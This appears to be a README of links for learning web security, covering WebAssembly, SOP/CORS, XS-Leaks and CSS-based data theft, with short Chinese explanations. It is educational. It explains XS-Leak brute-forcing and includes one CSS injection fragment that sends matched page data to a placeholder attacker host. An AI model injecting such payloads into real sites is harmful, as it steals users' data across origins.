# Web-Security-Learning    
Let's learn about Web Security.  

# Here comes the collection of some good articles
## How to take a good practice
* [安全研究者的自我修养](https://mp.weixin.qq.com/s?__biz=MzU0MzgzNTU0Mw==&mid=2247483913&idx=1&sn=2a0558592e072389e348dc8f7c6223d1&chksm=fb0416f1cc739fe7aed6f45167dc5a555974aaeb250cdcdc3bdd973ae151b8534a7c2cef6c43&scene=21#wechat_redirect)  
* [So you want to be a web security researcher?](https://portswigger.net/blog/so-you-want-to-be-a-web-security-researcher)  
* [如何阅读一份源代码？](https://www.codedump.info/post/20190324-how-to-read-code/)  

## WASM
* [WebAssembly Concepts
](https://developer.mozilla.org/en-US/docs/WebAssembly/Concepts)  
* [Using the WebAssembly JavaScript API
](https://developer.mozilla.org/en-US/docs/WebAssembly/Using_the_JavaScript_API)  
* [Introduction to WebAssembly](https://sensepost.com/blog/2018/introduction-to-webassembly/)  
* [玩轉 WebAssembly && 逆向](https://blog.1pwnch.com/web/reverse/2019/05/22/Say-Hello-to-WASM/#more)

## Frontend
* [你真的会使用XMLHttpRequest吗?](https://segmentfault.com/a/1190000004322487)  
* [SOP與CORS安全詳解](https://jiwo.org/ken/detail.php?id=2393)  

## XS-Leaks
* [Exposing Intranets with reliable Browser-based Port scanning](https://portswigger.net/blog/exposing-intranets-with-reliable-browser-based-port-scanning)  
* [从35c3CTF的filemanager题目中学到的一个小tips](https://blog.wonderkun.cc/2018/12/30/%E4%BB%8E35c3CTF%E7%9A%84filemanager%E9%A2%98%E7%9B%AE%E4%B8%AD%E5%AD%A6%E5%88%B0%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B0%8Ftips/#more)  
* [github-xsleaks](https://github.com/xsleaks/xsleaks/wiki)  
* [secret note keeper -- Facebook CTF 2019](https://sectt.github.io/writeups/FBCTF19/secret_note_keeper/README)  
* [gimme-a-bit-exploring-attacks-in-the-post-xss-world](https://speakerdeck.com/lmt_swallow/gimme-a-bit-exploring-attacks-in-the-post-xss-world)  

雖然和XSS一樣是跨域偷信息的技巧，但因為受限於SOP所以不是直接回傳信息，而是利用盲注: **配合爆破觀察瀏覽器的行為**(猜中和沒猜中頁面會有何差異)! 至於如何跨域觀察瀏覽器的行為呢? 特定信息是可以跨域傳送的，像是iframe count就不受SOP的限制，樓上35c3的filemanager就是利用onload數量和xss-auditor來跨域爆破出flag的!  

## Steal data with CSS
* [使用CSS窃取数据：攻击与防守](http://www.fwheart.club/2019/04/08/[%E8%AF%91]%E4%BD%BF%E7%94%A8CSS%E7%AA%83%E5%8F%96%E6%95%B0%E6%8D%AE%EF%BC%9A%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%AE%88/)  

在頁面中注入css，利用attribute selector，若match則傳送特定query (`{background:url("https://attack.host/aa");}`) 到自己的server以竊取資訊!
